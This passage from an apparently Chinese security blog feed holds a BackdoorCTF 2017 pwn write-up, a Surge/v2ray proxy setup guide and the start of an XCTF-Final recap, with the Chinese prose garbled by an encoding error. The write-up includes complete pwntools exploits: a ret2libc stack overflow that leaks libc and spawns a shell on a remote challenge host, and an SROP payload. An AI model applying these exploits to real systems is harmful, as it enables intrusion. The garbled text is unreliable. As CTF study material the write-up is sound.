class="string">&#x27;pause&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&#x27;aa&#x27;</span>+payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> io.recvall(timeout = <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><h2 id="JUST-DO-IT"><a href="#JUST-DO-IT" class="headerlink" title="JUST-DO-IT"></a>JUST-DO-IT</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">[*] <span class="string">&#x27;/home/swing/Desktop/CTF-Pwn/backdoor/justdoit/32_chal.dms&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>IDAï¼š<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2017-backdoodr-just-do-it-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2017-backdoodr-just-do-it-01.jpg"></a><br>æ ˆæº¢å‡ºï¼š</p><p>å°è¯•è¦†ç›–eip</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;A&quot;</span>*<span class="number">0x64</span>+<span class="string">&quot;BBBB&quot;</span>+<span class="string">&quot;CCCC&quot;</span>+<span class="string">&quot;DDDD&quot;</span></span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2017-backdoor-ctf-just-do-it-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2017-backdoor-ctf-just-do-it-02.jpg"></a><br>æ‰€ä»¥å½“æˆ‘ä»¬å½“è¾“å…¥ä¸º 112 + 4çš„æ—¶å€™èƒ½è¦†ç›–eipï¼Œæˆ‘ä»¬å°±èƒ½æ§åˆ¶ç¨‹åºè·³è½¬</p><h3 id="exploit-ç¼–å†™"><a href="#exploit-ç¼–å†™" class="headerlink" title="exploit ç¼–å†™"></a>exploit ç¼–å†™</h3><p>å› ä¸ºé¢˜ç›®å¼€å¯äº†NXï¼Œæ‰€ä»¥æ€è·¯æ˜¯æ„é€ leakï¼Œå»æ³„æ¼è®¡ç®—libcåœ°å€ï¼Œç„¶åè®¡ç®—system åœ°å€ï¼Œæ„é€ rop</p><h4 id="ropchain"><a href="#ropchain" class="headerlink" title="ropchain"></a>ropchain</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ropchain = <span class="string">&quot;A&quot;</span>*<span class="number">112</span></span><br><span class="line">ropchain += p32(write_plt)</span><br><span class="line">ropchain += p32(main_addr)</span><br><span class="line">ropchain += p32(<span class="number">1</span>)</span><br><span class="line">ropchain += p32(read_got)</span><br><span class="line">ropchain += p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ æœ€åæˆ‘å‘ç°æˆ‘å¾—åˆ°è¿œç¨‹ä¸€ç›´æ–­ï¼Œç„¶åå‘ç°ä»–ç»™çš„libcæœ‰é—®é¢˜</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2017-backdoor-ctf-just-do-it-03.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2017-backdoor-ctf-just-do-it-03.jpg"></a></p><p>ç¬¬äºŒæ¬¡æ ˆæº¢å‡ºçš„æ—¶å€™é‡æ–°è®¡ç®— è·ç¦»eipçš„è·ç¦»</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;A&quot;</span>*104</span><br><span class="line">payload += p32(system_addr)</span><br></pre></td></tr></table></figure><p>å°†ä¼šè¦†ç›–eipä¸ºsystemåœ°å€<br>æ‰€ä»¥ç¬¬äºŒæ®µpayloadæ„é€ ä¸ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">104</span></span><br><span class="line">payload += p32(system_addr)</span><br><span class="line">payload += <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">payload += p32(binsh_addr)</span><br></pre></td></tr></table></figure><p>å®Œæ•´expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">ip = <span class="string">&quot;163.172.176.29&quot;</span></span><br><span class="line">port = <span class="number">9036</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./32_chal.dms&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr =  <span class="number">0x804847d</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt;<span class="number">1</span>:</span><br><span class="line">    debug = <span class="literal">True</span></span><br><span class="line">    local = <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    debug = <span class="literal">False</span></span><br><span class="line">    local = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">    read_offset = libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh_offset = next(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">    read_offset = <span class="number">0xd4350</span></span><br><span class="line">    system_offset = <span class="number">0x3a940</span></span><br><span class="line">    binsh_offset = <span class="number">0x15900b</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    <span class="comment">#io = process(&quot;./32_chal.dms&quot;,env = &#123;&quot;LD_PRELOAD&quot;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line">    io = process(<span class="string">&quot;./32_chal.dms&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip,port)</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ropchain = <span class="string">&quot;A&quot;</span>*<span class="number">112</span></span><br><span class="line">ropchain += p32(write_plt)</span><br><span class="line">ropchain += p32(main_addr)</span><br><span class="line">ropchain += p32(<span class="number">1</span>)</span><br><span class="line">ropchain += p32(read_got)</span><br><span class="line">ropchain += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.sendline(ropchain)</span><br><span class="line"></span><br><span class="line">read_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">&quot;read_addr: 0x%x&quot;</span> % read_addr)</span><br><span class="line">libc_base = read_addr - read_offset</span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line">binsh_addr = libc_base + binsh_offset</span><br><span class="line"></span><br><span class="line"><span class="comment">#log.info(&quot;system_offset:0x%x&quot; % libc.symbols[&quot;system&quot;])</span></span><br><span class="line"><span class="comment">#log.info(&quot;binsh_offset: 0x%x&quot; % next(libc.search(&quot;/bin/sh\x00&quot;)))</span></span><br><span class="line">log.info(<span class="string">&quot;system_addr: 0x%x&quot;</span> % system_addr)</span><br><span class="line">log.info(<span class="string">&quot;binsh_addr: 0x%x&quot;</span> % binsh_addr)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;&#x27;&#x27;break *0x80484b9&#x27;&#x27;&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">104</span></span><br><span class="line">payload += p32(system_addr)</span><br><span class="line">payload += <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">payload += p32(binsh_addr)</span><br><span class="line">io.recv()</span><br><span class="line">pause()</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment">#io.recv()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="FUNSIGNALS"><a href="#FUNSIGNALS" class="headerlink" title="FUNSIGNALS"></a>FUNSIGNALS</h2><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-backdoor-ctf-funsignals-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-backdoor-ctf-funsignals-01.jpg"></a>syscall å…ˆæ˜¯è°ƒç”¨read </p><p>ä½†æ˜¯æ²¡æœ‰ret å¾ˆå¹²é˜¿ã€‚ã€‚ã€‚</p><p>ä½†æ˜¯å‘ç°ä»–è°ƒç”¨äº† sys_rt_sigreturn å§æ§½ è¿™ä¸æ˜¯sropå—â€¦<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-backdoor-ctf-funsignals-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-backdoor-ctf-funsignals-02.jpg"></a><br>å‘ç°å…¶å®flagæ˜¯å†™åœ¨binç¨‹åºé‡Œçš„</p><p>æ‰€ä»¥åªè¦æ„é€ ropï¼Œè°ƒç”¨writeupï¼Œå°†è¿™ä¸ªflagè¯»å‡ºæ¥å°±å¯ä»¥äº†ã€‚ã€‚ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_write</span><br><span class="line">frame.rdi = constants.STDOUT_FILENO</span><br><span class="line">frame.rsi = <span class="number">0x10000023</span> <span class="comment">#flag string address</span></span><br><span class="line">frame.rdx = <span class="number">50</span> <span class="comment">#read size</span></span><br><span class="line">frame.rsp = <span class="number">0xABADCAFE</span></span><br><span class="line">frame.rip = <span class="number">0x10000015</span> <span class="comment">#syscall gadget</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./player_bin.dms&quot;</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#io = remote(&quot;163.172.176.29&quot;, 9034)</span></span><br><span class="line">io.send(str(frame))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> BackdoorCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mac-Surge-2 éƒ¨åˆ†é…ç½®</title>
      <link href="Mac-Surge-2.html"/>
      <url>Mac-Surge-2.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="ssä»£ç†è®¾ç½®"><a href="#ssä»£ç†è®¾ç½®" class="headerlink" title="ssä»£ç†è®¾ç½®"></a>ssä»£ç†è®¾ç½®</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[Proxy]</span><br><span class="line">ğŸ‡­ğŸ‡° HK = custom,abclite.cn,10000,rc4-md5,abclite.cn,https://github.com/stoneChen/Surge-config/raw/master/SSEncrypt.module</span><br><span class="line">ğŸ‡¸ğŸ‡¬ SG = custom,abclite.cn,10000,rc4-md5,abclite.cn,https://github.com/stoneChen/Surge-config/raw/master/SSEncrypt.module</span><br><span class="line">ğŸ‡¯ğŸ‡µ JP = custom,abclite.cn,10000,rc4-md5,abclite.cn,https://github.com/stoneChen/Surge-config/raw/master/SSEncrypt.module</span><br><span class="line">ğŸ‡ºğŸ‡¸ US = custom,abclite.cn,10000,rc4-md5,abclite.cn,https://github.com/stoneChen/Surge-config/raw/master/SSEncrypt.module</span><br><span class="line">ğŸ‡°ğŸ‡· KR = custom,abclite.cn,10000,rc4-md5,abclite.cn,https://github.com/stoneChen/Surge-config/raw/master/SSEncrypt.module</span><br></pre></td></tr></table></figure><p>[Proxy]æ˜¯å…·ä½“çš„ä»£ç†é…ç½®ï¼Œå®ƒä¸‹é¢å°±æ˜¯5ä¸ªssæœåŠ¡å™¨èŠ‚ç‚¹, è¿™é‡Œåªæ˜¯5ä¸ªå›½å®¶ä¾‹å­ï¼Œæ ¹æ®ä½ æ‹¥æœ‰çš„ssè´¦å·æ•°æ¥å†³å®šï¼Œæ‹¥æœ‰å‡ ä¸ªè´¦å·å°±ç•™ä¸‹å…¶ä¸­å‡ ä¸ªå¯¹åº”å›½æ——é…ç½®å°±å¥½ã€‚è¡¨é¢ä¸Šçœ‹å°±æ˜¯5ä¸ªé”®å€¼å¯¹(é”®å¯ä»¥è‡ªå®šä¹‰)ï¼Œé”®ä¸­åŠ ä¸Šå›½æ——å¯ä»¥å¾ˆç›´è§‚çš„åŒºåˆ†ä¸åŒå›½å®¶çš„ssèŠ‚ç‚¹ï¼Œå€¼ä¸­çš„å˜é‡åˆ†åˆ«è¡¨ç¤ºï¼š</p><ul><li>ss-server host: ssä¸»æœºï¼Œipæˆ–åŸŸå</li><li>ss-server port: ssä¸»æœºç«¯å£</li><li>ss encrypt type: åŠ å¯†æ–¹å¼</li><li>ss-password: sså¯†ç <br>customä¸èƒ½æ”¹ï¼Œæ˜¯ä¸€ä¸ªçº¦å®šç±»å‹(ssåè®®)ï¼Œæœ€æœ«ä¸€é¡¹æ˜¯ssæ¨¡å—ä¸‹è½½åœ°å€ï¼Œä¹Ÿä¸éœ€è¦æ”¹,å½“é€‰æ‹©äº†å½“å‰é…ç½®æ‰€åœ¨çš„é…ç½®æ–‡ä»¶ï¼ŒSurgeä¼šå»ä¸‹è½½ssæ¨¡å—ï¼Œæœ‰å¼¹çª—æç¤ºã€‚<br>[Proxy Group]æ˜¯ä¸€ä¸ªç»„ç­–ç•¥é…ç½®ï¼Œå®ƒçš„æŸä¸€é¡¹é…ç½®å¯ä»¥å¼•ç”¨[Proxy]ä¸­çš„é…ç½®ï¼Œä¹Ÿå¯ä»¥å¼•ç”¨å…¶ä»–çš„ç»„ç­–ç•¥é…ç½®ã€‚è¿™é‡Œæœ‰select, url-test, ssidä¸‰ç§ç­–ç•¥å¯ä»¥ç”¨ï¼Œå…·ä½“è¯·é˜…è¯»example-chinese.confä¸­çš„æ³¨é‡Šã€‚<br>ç®€å•è®²ï¼š</li><li>selectï¼šåœ¨èœå•ä¸Šæ‰‹åŠ¨é€‰æ‹©ssèŠ‚ç‚¹</li><li>url-testï¼šå®šæ—¶è½®è¯¢å‘æŒ‡å®šçš„åœ°å€å‘èµ·è¯·æ±‚ï¼Œå“ªä¸ªèŠ‚ç‚¹å“åº”æ—¶é—´æœ€çŸ­ï¼Œåˆ™åˆ‡æ¢åˆ°å“ªä¸ªssèŠ‚ç‚¹</li><li>ssidï¼š æ ¹æ®wifiåå­—è¿›è¡Œåˆ‡æ¢ssèŠ‚ç‚¹</li></ul><p>æ›´å¤šè¯¦å°½çš„é…ç½®å¯ä»¥çœ‹<a href="https://github.com/WinMin/Surge/blob/master/surge.conf">github</a></p><h2 id="ç»ˆç«¯ä»£ç†"><a href="#ç»ˆç«¯ä»£ç†" class="headerlink" title="ç»ˆç«¯ä»£ç†"></a>ç»ˆç«¯ä»£ç†</h2><p>macä¸‹æˆ‘ç”¨çš„æ˜¯oh-my-zsh<br><code>vim vim ~/.zshrc </code><br>åœ¨åº•ä¸‹åŠ ä¸Š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proxy=http://127.0.0.1:8888</span><br><span class="line"><span class="built_in">export</span> http_proxy=<span class="variable">$proxy</span></span><br><span class="line"><span class="built_in">export</span> https_proxy=<span class="variable">$proxy</span></span><br><span class="line"><span class="built_in">export</span> ftp_proxy=<span class="variable">$proxy</span></span><br></pre></td></tr></table></figure><p>åœ¨æˆ‘çš„Surgeé…ç½®æ–‡ä»¶ä¸­æ˜¯8888ç«¯å£ï¼Œæ‰€ä»¥è¿™é‡Œä¹Ÿç›¸åº”æ˜¯å¦‚æ­¤</p><h2 id="Surge-ä¸v2ray-æ›´æ–°äº2019-06-21"><a href="#Surge-ä¸v2ray-æ›´æ–°äº2019-06-21" class="headerlink" title="Surge ä¸v2ray(æ›´æ–°äº2019-06-21)"></a>Surge ä¸v2ray(æ›´æ–°äº2019-06-21)</h2><p>æœ€è¿‘ä» shadowsocks è½¬åˆ°äº†v2ray äºæ˜¯å°±è¿˜æƒ³è¦ä½¿ç”¨surge åšv2rayä»£ç†ã€‚</p><ol><li>é¦–å…ˆï¼Œä¸‹è¼‰ <a href="https://github.com/v2ray/v2ray-core/releases">v2ray-core</a> çš„æœ€æ–°ç‰ˆæœ¬ï¼Œæ³¨æ„ä¸‹è¼‰çš„æ˜¯ v2ray-macos.zipã€‚</li><li>ç„¶åé…ç½® config.jsonã€‚</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;inbounds&quot;</span>: [&#123;</span><br><span class="line">    <span class="attr">&quot;port&quot;</span>: <span class="number">8886</span>,  <span class="comment">// SOCKS ä»£ç†ç«¯å£ï¼Œåœ¨æµè§ˆå™¨ä¸­éœ€é…ç½®ä»£ç†å¹¶æŒ‡å‘è¿™ä¸ªç«¯å£</span></span><br><span class="line">    <span class="attr">&quot;listen&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;protocol&quot;</span>: <span class="string">&quot;socks&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;settings&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;udp&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;],</span><br><span class="line">  <span class="attr">&quot;outbounds&quot;</span>: [&#123;</span><br><span class="line">    <span class="attr">&quot;protocol&quot;</span>: <span class="string">&quot;vmess&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;settings&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;vnext&quot;</span>: [&#123;</span><br><span class="line">        <span class="attr">&quot;address&quot;</span>: <span class="string">&quot;xx.xx.xx.xx&quot;</span>, <span class="comment">// æœåŠ¡å™¨åœ°å€ï¼Œè¯·ä¿®æ”¹ä¸ºä½ è‡ªå·±çš„æœåŠ¡å™¨ ip æˆ–åŸŸå</span></span><br><span class="line">        <span class="attr">&quot;port&quot;</span>: <span class="number">46704</span>,  <span class="comment">// æœåŠ¡å™¨ç«¯å£</span></span><br><span class="line">        <span class="attr">&quot;users&quot;</span>: [&#123; <span class="attr">&quot;id&quot;</span>: <span class="string">&quot;xxx-xxx-xxx&quot;</span> &#125;]</span><br><span class="line">      &#125;]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,&#123;</span><br><span class="line">    <span class="attr">&quot;protocol&quot;</span>: <span class="string">&quot;freedom&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;tag&quot;</span>: <span class="string">&quot;direct&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;settings&quot;</span>: &#123;&#125;</span><br><span class="line">  &#125;],</span><br><span class="line">  <span class="attr">&quot;routing&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;domainStrategy&quot;</span>: <span class="string">&quot;IPOnDemand&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;rules&quot;</span>: [&#123;</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;field&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;ip&quot;</span>: [<span class="string">&quot;geoip:private&quot;</span>],</span><br><span class="line">      <span class="attr">&quot;outboundTag&quot;</span>: <span class="string">&quot;direct&quot;</span></span><br><span class="line">    &#125;]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç±»ä¼¼äºä¸Šé¢è¿™æ ·ã€‚</p><ol start="3"><li><p>ç„¶ååœ¨ç»ˆç«¯ ä½¿ç”¨ <code>/path/to/v2ray -config=/path/to/json</code> ä¾†å•Ÿå‹• v2rayã€‚æˆ–è€…å†™ä¸ªè„šæœ¬åšé…ç½®ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">nohup ./v2ray --config=./config.json &gt; /dev/null &amp;</span><br></pre></td></tr></table></figure></li></ol><p>ç´§æ¥ç€å°±è¦é…ç½® surge éƒ¨åˆ†ã€‚</p><ol><li><p>.conf é…ç½®æ–‡ä»¶æ–‡ä»¶ï¼Œåœ¨ <code>Proxy</code> éƒ¨åˆ†æ·»åŠ  <code>v2ray = socks5,127.0.0.1,8886</code></p><p>ç±»ä¼¼äºè¿™æ ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[Proxy]</span><br><span class="line">ğŸŒ DIRECT &#x3D; direct</span><br><span class="line">v2ray &#x3D; socks5,127.0.0.1,8886</span><br><span class="line"></span><br><span class="line">[Proxy Group]</span><br><span class="line">â˜ï¸ PROXY &#x3D; select, ğŸƒ AUTO, ğŸŒ DIRECT, PROXY</span><br><span class="line">PROXY &#x3D; select, ğŸ‡­ğŸ‡° HK,ğŸ‡ºğŸ‡¸ us, ğŸ‡­ğŸ‡° hk ,v2ray</span><br><span class="line">ğŸƒ AUTO &#x3D; url-test, ğŸ‡­ğŸ‡° HK,ğŸ‡ºğŸ‡¸ us, ğŸ‡­ğŸ‡° hk,v2ray,url &#x3D; http:&#x2F;&#x2F;www.gstatic.com&#x2F;generate_204, interval &#x3D; 1200</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> ç¯å¢ƒé…ç½® </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Surge </tag>
            
            <tag> ç§‘å­¦ä¸Šç½‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-Final &amp;iscå®‰å…¨è®­ç»ƒè¥ å‚åŠ æ€»ç»“</title>
      <link href="2017-XCTF-Final.html"/>
      <url>2017-XCTF-Final.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="First-Day"><a href="#First-Day" class="headerlink" title="First Day"></a>First Day</h2><p>ç¬¬ä¸€å¤©å»äº†iscå®‰å…¨è®­ç»ƒè¥,<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xctf-final-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xctf-final-01.jpg"></a></p><p>æ—©ä¸Šå¬äº†æµè§ˆå™¨å†…å®¹ï¼Œä¸»è¦å†…å®¹æ˜¯å¾®è½¯Edgeå’Œè°·æ­ŒChromeä¸¤ä¸ªæµè§ˆå™¨ï¼ŒChromeæ˜¯å¤§å®å¸ˆå‚…è®²çš„å†…å®¹ã€‚</p><p>æ¯”è¾ƒæœ‰å°è±¡çš„çš„æ˜¯Vulcan Team çš„holynopè®²çš„Edgeæµè§ˆå™¨çš„Chakraè„šæœ¬å¼•æ“<br>äº†è§£äº†ç±»å‹æ··æ·†çš„æ¼æ´ï¼Œä»¥åŠå¦‚ä½•å»åˆ©ç”¨windgbå»è°ƒè¯•æµè§ˆå™¨ã€‚<br>å®Œæˆrce<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-iscc-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-iscc-01.jpg"></a></p><p><del>ï¼ˆå‡†å¤‡è‡ªå·±åŠ¨æ‰‹è°ƒè¯•ä¸‹è¿™ä¸ªæ¼æ´ï¼ï¼ï¼ åº”è¯¥ä¹Ÿä¼šå†™ä¸ªåšå®¢å§æˆ–è€…æ‹¿å»æŠ•ç¨¿ï¼Ÿï¼Ÿï¼Ÿï¼‰</del></p><p>ä¸‹åˆå‘¢ï¼Œè®²çš„æ˜¯windowså†…æ ¸æ¼æ´</p><p>æ‰‹å¤´æœ‰poc ä¹Ÿæ˜¯åº”è¯¥å‡†å¤‡å¤ç°çš„æ¼æ´ï¼</p><h2 id="Second-Day"><a href="#Second-Day" class="headerlink" title="Second Day"></a>Second 